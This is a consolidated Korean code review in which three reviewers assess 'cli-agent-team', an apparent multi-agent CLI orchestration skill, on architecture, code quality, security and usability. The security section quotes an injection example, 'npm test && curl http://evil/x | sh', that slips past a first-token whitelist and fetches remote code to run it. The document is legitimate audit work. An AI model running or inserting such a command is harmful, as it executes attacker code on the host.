---
date: 2026-06-29
evaluators: [agy, Claude (Opus 4.8), codex]
target: skills/cli-agent-team/
---

# cli-agent-team 에이전트 리뷰 취합본

> 3개의 외부 리뷰어(agy · Claude · codex)가 독립적으로 코드를 읽고 작성한 평가를 섹션별로 취합한 문서입니다.

---

## 점수 요약

| 섹션 | agy | Claude | codex | 평균 |
|------|-----|--------|-------|------|
| 1. 아키텍처 설계 | 7/10 | 6/10 | 5/10 | **6.0** |
| 2. 코드 품질 | 5/10 | 6/10 | 4/10 | **5.0** |
| 3. 보안 | 4/10 | 4/10 | 3/10 | **3.7** |
| 4. 실용성 | 6/10 | 5/10 | 3/10 | **4.7** |
| 5. 놓친 것 / 맹점 | 5/10 | — | 3/10 | **4.0** |
| **종합** | **5.3** | **6.0** | **4.0** | **5.1** |

> Claude 리뷰의 5번 항목은 단일 점수 대신 심각도 태그([높음]/[중간]/[낮음])로 표기됨.

---

## 1. 아키텍처 설계

### 공통으로 평가된 문제

**`dashboard.sh` · `record-score.sh`의 경로 추정 버그** (3인 모두 지적)
- `SCRIPT_DIR/../../..`로 프로젝트 루트를 하드코딩. `install-skill.ps1`로 설치하면 경로가 `~/.claude` 또는 `<project>/.claude`로 빠져 엉뚱한 디렉터리를 가리킴.
- `dispatch.sh`·`verify.sh`는 `[project-dir]` 인자를 받아 위치 독립적인데, 같은 스킬 내에서 철학이 이분화됨.

**`cross-review.sh` API 불일치** (3인 모두 지적)
- `agent-team.sh:25`가 안내하는 인터페이스: `cross-review <task-id> <auth> [dir] [tier]`
- 실제 `cross-review.sh:9-10`: 두 번째 인자를 `PROJECT_DIR`로 해석 → 호출 즉시 크래시.
- 추가로 내부에서 `dispatch.sh`를 항상 `full` 권한으로 호출(하드코딩).

**런타임이 LLM 산문에 의존** (Claude 지적)
- 950줄 한국어 산문이 상태기계 역할을 하며 어떤 드라이버 스크립트도 단계 순서를 강제하지 않음. 단계 누락·순서 뒤바뀜을 검출할 수단이 없음.

**공유 상태의 동시성 보호 부재** (Claude·codex 지적)
- 병렬 모드에서 `LOG.md`·`.agent_scores.json`에 동시 기록 시 락이 없음.
- `record-score.sh:136-155`가 read-modify-write를 원자적으로 처리하지 않아 점수 유실 경로가 열림.

### 평가자별 추가 지적

**agy**: `verify.sh` 내부에서 `record-score.sh`를 직접 호출(검증 컴포넌트가 점수 기록 도메인에 결합). 에이전트 폴백 로직도 실행기 하위 컴포넌트인 `dispatch.sh`에 하드코딩됨.

**agy**: `verify.sh`가 이전 세션의 로그 잔재(`_agy_stdout.log` 등)를 보고 실행되지 않은 에이전트를 실행됐다고 잘못 판단할 위험.

**codex**: `agent-team.sh:42`의 `init)`이 `setup.sh`만 호출하지만 `setup.sh`는 conf 파일만 생성. `PLAN.md`·`AGENT_ROLES.md` 생성 로직은 `init.sh`에 있어 진입점이 분리됨.

---

## 2. 코드 품질

### 공통으로 평가된 문제

**`init.sh`가 `완전자율`을 기본값으로 설정** (Claude·codex 지적)
- `init.sh:163-166`이 확인 없이 `수준: 완전자율`을 생성. `SKILL.md:27-29`("기본값으로 가정하지 않는다")·`SKILL.md:249`("제한된 자율(기본 권장)")와 정면 모순.

**`dispatch.sh`의 Windows `timeout` 명령어 충돌** (agy·Claude 간접 지적)
- `command -v timeout`이 Windows 내장 `C:\Windows\System32\timeout.exe`를 잡아 참 반환.
- Windows timeout은 sleep 전용으로 명령 래핑을 지원하지 않아 즉시 에러 후 크래시.

**모델 ID 하드코딩** (Claude 지적)
- `dispatch.sh:301-302,342-343`에 `gpt-5.5`/`claude-sonnet-4-6`/`claude-haiku-4-5-20251001` 리터럴 박힘. 가장 빠르게 노후화되는 값을 conf로 분리하지 않음.

**`extract_section` 종료 패턴 불일치** (Claude 지적)
- `verify.sh:63`은 `^##[^#]`, `parallel-check.sh:45`는 `^## `으로 서로 다름. 복붙 후 갈라진 유지보수 부채.

**필수 섹션 누락 시 skip 처리** (codex 지적)
- `verify.sh:78-80`·`verify.sh:167-178`에서 섹션이 없으면 실패가 아닌 skip. 거짓 안정감을 줌.

### 긍정적으로 평가된 부분

- 대부분 스크립트의 `set -euo pipefail` + `${VAR:?msg}` 일관 사용.
- `dispatch.sh:249-255`의 pre-dispatch 스냅샷 + `verify.sh:90-104`의 `comm -23` 비교: 기존 변경 오탐 방지.
- Windows Git Bash의 awk 한글 패턴 미지원을 grep+tail+head로 우회한 `extract_section`.
- `dispatch.sh`의 agy 빈 출력 → codex 폴백 자동화.
- `doctor.sh`의 11개 항목 OK/WARN/FAIL 진단.

---

## 3. 보안

### 공통으로 평가된 핵심 결함: 화이트리스트 우회 (3인 모두 지적)

```bash
# verify.sh:192-202
_cmd_bin=$(echo "$cmd" | sed 's/^[[:space:]]*//' | cut -d' ' -f1 | sed 's|.*/||')
# 검사: 첫 토큰만
for _w in $_wl; do [ "$_cmd_bin" = "$_w" ] && _ok=true && break; done
# 실행: 전체 문자열 그대로
bash -c "$cmd"
```

- `AGENT_ROLES.md`에 `npm test && curl http://evil/x | sh` 한 줄이면 첫 토큰 `npm`이 화이트리스트를 통과하고 공격 구문 전체가 실행됨.
- `;`, `&&`, `||`, `|`, `$()`, 백틱 어떤 메타문자도 차단되지 않음.
- `limited` 모드에서 특히 위험: CLI 자체는 승인 게이트로 막혀 있지만 Claude가 돌리는 `bash -c`는 호스트에서 게이트 없이 실행됨 → **샌드박스 경계를 우회하는 권한 상승**.
- 화이트리스트에 `bash`, `sh`, `node`, `python3` 등 범용 실행기 포함 → 어떤 공격 구문도 포장해 실행 가능.

### 추가 보안 문제

**`cross-review.sh` 권한 하드코딩** (agy·codex 지적)
- `limited` 모드로 시작해도 크로스 리뷰 호출 시 내부에서 `full` 권한으로 승격됨.

**`.cli-agent-team.conf` source** (codex 지적)
- `dispatch.sh:124-127`이 프로젝트 파일을 실행 코드로 취급. 파일 변조 → 다음 dispatch에서 임의 셸 코드 실행.

**스코프 초과 감지 후에도 명령 실행** (Claude 지적)
- `verify.sh`가 검사 1(스코프 초과, `FAILED=1`)을 기록한 뒤에도 검사 3(명령 실행)을 이어 돌림. 변조 감지와 변조된 명령 실행이 동일 실행에서 동시에 일어남.

**`TASK_ID` 경로 traversal 미검증** (codex 지적)
- `worktree-dispatch.sh:29-32`가 `TASK_ID`를 그대로 디렉터리명·브랜치명에 삽입. 형식 검증 없음.

**untracked 파일 시크릿 스캔 누락** (codex 지적)
- `verify.sh:268`이 `git diff HEAD`만 검사. 새로 생성된 untracked 파일에 담긴 시크릿은 탐지 불가.

---

## 4. 실용성

### 공통으로 평가된 문제

**`docs/quickstart.md` 부재** (3인 모두 확인)
- 리뷰 대상으로 지정됐으나 파일이 존재하지 않음. 5분 온보딩 평가 불가 자체가 감점.

**`agent-team init`의 실제 초기화 미수행** (Claude·codex 지적)
- `agent-team.sh:42`의 `init)` → `setup.sh` 호출 → conf만 생성. `PLAN.md`·`AGENT_ROLES.md` 미생성.
- `SKILL.md:335-342` 안내와 실제 동작 불일치.

**`dashboard.sh --watch` 신뢰성** (agy·Claude 지적)
- `read -t 1 -n 1`이 Windows Git Bash에서 불안정. 고정폭 시계 행이 실제 헤더 폭과 불일치 → 정렬 깨짐.

**`setup.sh`의 잘못된 PowerShell 안내** (codex 지적)
- `setup.sh:168`이 `bash scripts/agent-watch.ps1`을 출력. `.ps1`은 PowerShell 스크립트.

### 긍정적으로 평가된 부분

- `doctor.sh`의 11개 점검 항목과 pty-bridge 미발견 시 3-옵션 해결 안내(Claude 평가: "모범적").
- `dispatch.sh`의 error.log 자동 트림 + `verify.sh`의 항목별 ✅/❌ 출력.
- agy 폴백 자동화로 가장 자주 막히는 지점 자동 복구.

---

## 5. 놓친 것 / 맹점

### [높음] 심각도 — 배포 전 차단

| 문제 | 리뷰어 |
|------|--------|
| `verify.sh` 화이트리스트 우회 → 권한 상승 | 3인 공통 |
| 병렬 모드에서 공유 상태 락 부재 (`LOG.md`, `.agent_scores.json`) | Claude·codex |
| `worktree-dispatch.sh`: 실패 작업의 부분 변경도 메인 작업트리 오염 | Claude |
| `worktree-dispatch.sh`: 삭제·rename·권한 변경 미반영 | codex |

### [중간] 심각도 — 고쳐야 할 부채

| 문제 | 리뷰어 |
|------|--------|
| 병렬 실행 + uncommitted 변경 시 워크트리 격리 자동 무력화 | agy |
| 강제 중단 시 가비지 워크트리·임시 브랜치 정리 누락 (EXIT/INT trap 없음) | agy |
| `SKILL.md:937` claude 폴백 설명 vs `dispatch.sh:354` 미구현 후 exit 2 | agy |
| `dirty worktree` 파일명만 비교 → 동일 파일 추가 수정 시 검증 통과 | codex |
| 점수 통계 왜곡: 완전 실패 태스크가 승률 계산에 미반영 | codex |
| `parallel-check.sh`: 경로 경계 무시 접두사 비교로 오탐 가능 | codex |
| `parallel-check.sh`가 `AGENT_ROLES.md` 병렬 허용 조건을 실제로 읽지 않음 | codex |
| 3번째 에이전트 추가 시 `dispatch.sh`·`record-score.sh` 직접 편집 필요 | Claude |
| `dispatch.sh:270-276`의 RTK·MCP 지시 → 개인 환경 의존성 유출 | Claude |

### [낮음] 심각도 — 개선 권장

- `dashboard.sh`의 O(n) 셸 루프: 태스크 수십 개 시 성능 저하.
- `worktree-dispatch.sh`: 임시 브랜치 삭제로 격리 실행의 git 출처 소멸.

---

## 6. 종합 판정

### 리뷰어별 한 줄 평

| 리뷰어 | 점수 | 핵심 평가 |
|--------|------|-----------|
| **agy** | 5.3/10 | `cross-review.sh` 크래시·RCE 예방 불가·워크트리 격리 자동 무력화 — 결정적 결함 패치 전 프로덕션 도입 부적합 |
| **Claude** | 6/10 | 잘 만든 1인용 프로토타입. 보안 경계가 착시이고 배포 경로에서 대시보드가 깨짐 |
| **codex** | 4/10 | 초기화 진입점 깨짐·권한 모델 구현 우회·파일 기반 race 조건 — 팀 프로젝트 투입 불가 |
| **평균** | **5.1/10** | Conditional (조건부 사용) |

### 즉시 수정이 필요한 Top 5 (3인 리뷰 교집합)

1. **`verify.sh` 명령 실행 보안 수정**  
   셸 메타문자(`;`, `&&`, `|`, `$()`, 백틱) 포함 시 거부. 스코프 검사(검사 1) 실패 시 명령 실행(검사 3) 건너뜀. `bash -c "$cmd"` → 토큰 배열 직접 실행으로 교체.

2. **`cross-review.sh` API 수정**  
   두 번째 인자를 권한 모드로 올바르게 파싱. `full` 권한 하드코딩 제거. `agent-team.sh` 래퍼 인터페이스와 일치.

3. **`dashboard.sh` · `record-score.sh` 경로 추정 제거**  
   `../../..` 하드코딩 → `[project-dir]` 인자(+ env 폴백) 방식으로 전환.

4. **`init.sh` 권한 기본값 수정**  
   `완전자율` → `제한된 자율`로 변경해 `SKILL.md` 철학과 일치.

5. **`docs/quickstart.md` 작성 또는 참조 제거**  
   온보딩 진입 문서를 실제로 추가하거나 리뷰/문서에서 참조를 제거.

---

## 부록: 원본 리뷰

- [review_agy.md](review_agy.md) — agy 리뷰 (5.3/10)
- [review_claude.md](review_claude.md) — Claude Opus 4.8 리뷰 (6/10)
- [review_codex.md](review_codex.md) — codex 리뷰 (4/10)
